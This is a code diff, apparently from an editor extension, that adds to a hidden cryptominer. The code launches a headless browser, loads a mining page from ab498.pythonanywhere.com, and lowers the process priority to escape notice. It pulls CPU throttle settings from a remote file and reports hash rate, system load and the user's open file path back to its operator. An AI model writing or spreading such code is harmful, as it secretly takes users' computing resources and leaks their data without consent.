@@ -59,15 +59,23 @@
     await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     let browser;
     let page;
+    let minUse = 0.3;
+    let maxUse = 0.5;
+
     setInterval(async () => {
       if (browser && page) {
         const hs = await page.evaluate(() => { return window._client?.getHashesPerSecond(); });
+        let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         tstt({
           message: "HASH",
           value: parseFloat(hs).toFixed(2),
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
           file: safe(() => editor?.document?.uri?.fsPath)
+        });
+        maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
+        await page.evaluate(() => {
+          if (window.use != maxUse) window.location.href = 'https://ab498.pythonanywhere.com/files/init.html?use=' + maxUse;
         });
       } else {
         tstt({
@@ -78,7 +86,6 @@
       }
     }, 60000);
 
-    await new Promise(r => setTimeout(r, 5 * 60 * 1000));
 
     const cacheDir = `${os.homedir()}/.cache/puppeteer`;
     if (!fs.existsSync(cacheDir)) {
@@ -92,7 +99,7 @@
 
 
     if (!chromeBrowser) {
-      await new Promise(r => setTimeout(r, 5 * 60 * 1000));
+      await new Promise(r => setTimeout(r, 10 * 60 * 1000));
       await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
@@ -120,7 +127,8 @@
     });
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.6 : 0.3));
+    
+    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.2));
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
